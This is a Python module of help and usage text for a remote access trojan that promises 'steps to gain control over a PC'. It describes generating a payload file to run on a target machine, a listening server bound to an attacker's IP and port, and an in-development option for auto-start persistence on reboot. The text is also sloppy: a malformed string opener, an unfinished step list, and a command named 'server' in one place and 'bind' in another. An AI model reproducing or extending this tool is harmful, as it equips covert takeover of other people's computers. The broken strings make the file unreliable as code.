from common.output import *

GREETINGS_MESSAGE = """"
1 Generate payload (generate)
2 Launch server (server)
"""

HELP_OVERALL = f"""
Welcome to the RAT. Steps to gain control over a PC.
1. Create payload using {make_blue("command")}
2. Launch the payload (

Usage: {make_bold("python main.py ")} {make_blue("command")} {make_yellow("--help")}
These are {make_blue("commands")} available for usage:

    {make_green("bind")}        Run the Server on machine and establish connections
    {make_green("generate")}    Generate the Payload file for target platform

{make_bold("IP ADDRESS AND PORT IN BOTH COMMANDS SHOULD BE THE SAME")}

You can further get help on available commands by supplying {make_yellow("--help")} argument.
For example: {make_bold("python main.py generate --help")}
"""

HELP_BIND = f"""

Launches server and binds it to provided IP address and port

Usage: {make_bold("python main.py ")} {make_blue("bind")} {make_yellow("--address X.X.X.X")} {make_yellow("--port X")} 

    Args              Description
    -h, --help        Show Help for Bind command
    -a, --address     IP Address to Bind to
    -p, --port        Port Number on which to Bind
"""

HELP_GENERATE = f"""
{make_bold("GENERATE")} 
Generates the required payload file to be executed on client side. 
The compiled version {make_bold("has to generated on the respective platform.")}  
For example, you can't generate an .exe file on Linux. You specifically have to be on Windows.

Usage: {make_bold("python main.py ")} {make_blue("generate")} {make_yellow("--address X.X.X.X")} {make_yellow("--port X")} {make_yellow("--output filename")} 

    Args                                  Description
    
    {make_yellow("--help")}        Show Help Manual for generate command
    {make_yellow("--address")}     IP Address of server. [Connect to]
    {make_yellow("--port")}        Port of connecting server
    {make_yellow("--output")}      Output file to generate
    {make_yellow("--source")}      Do not generate compiled code (generates Python source file)
    {make_yellow("--persistence")} Auto start on reboot [Under Development]
"""
